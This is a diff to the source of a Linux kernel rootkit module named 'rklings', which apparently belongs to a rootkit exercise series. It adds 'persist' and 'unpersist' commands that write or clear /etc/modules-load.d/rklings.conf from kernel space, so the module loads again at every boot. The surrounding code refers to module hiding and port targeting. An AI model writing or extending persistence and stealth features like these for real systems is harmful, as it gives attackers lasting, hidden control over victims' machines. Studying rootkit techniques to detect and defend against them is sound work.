@@ -2,6 +2,7 @@
 #include <linux/cred.h>
 #include <linux/err.h>
 #include <linux/errno.h>
+#include <linux/fs.h>
 #include <linux/hex.h>
 #include <linux/inet.h>
 #include <linux/init.h>
@@ -26,6 +27,8 @@
 #define RK_PREFIX "rklings."
 #define RK_PREFIX_LEN 8
 #define RK_PATH_MAX 128
+#define RK_PERSIST_PATH "/etc/modules-load.d/rklings.conf"
+#define RK_PERSIST_CONTENT "rklings\n"
 
 static unsigned short peer_port;
 module_param(peer_port, ushort, 0400);
@@ -61,7 +64,7 @@ struct rk_target_list port_targets;
 static struct proc_dir_entry *proc_entry;
 static struct list_head *saved_prev;
 bool module_hidden;
-static bool persist_requested;
+bool persist_requested;
 
 /* --- module hiding (M01) --- */
 
@@ -143,7 +146,25 @@ static int rk_parse_local_command(const char *path)
 		return 0;
 	}
 	if (strcmp(cmd, "persist") == 0) {
+		struct file *f;
+
+		f = filp_open(RK_PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
+		if (!IS_ERR(f)) {
+			kernel_write(f, RK_PERSIST_CONTENT,
+				     sizeof(RK_PERSIST_CONTENT) - 1, &f->f_pos);
+			filp_close(f, NULL);
+		}
 		persist_requested = true;
+		return 0;
+	}
+	if (strcmp(cmd, "unpersist") == 0) {
+		struct file *f;
+
+		f = filp_open(RK_PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
+		if (!IS_ERR(f)) {
+			filp_close(f, NULL);
+		}
+		persist_requested = false;
 		return 0;
 	}
 	if (strncmp(cmd, "h.f.", 4) == 0 && cmd[4])
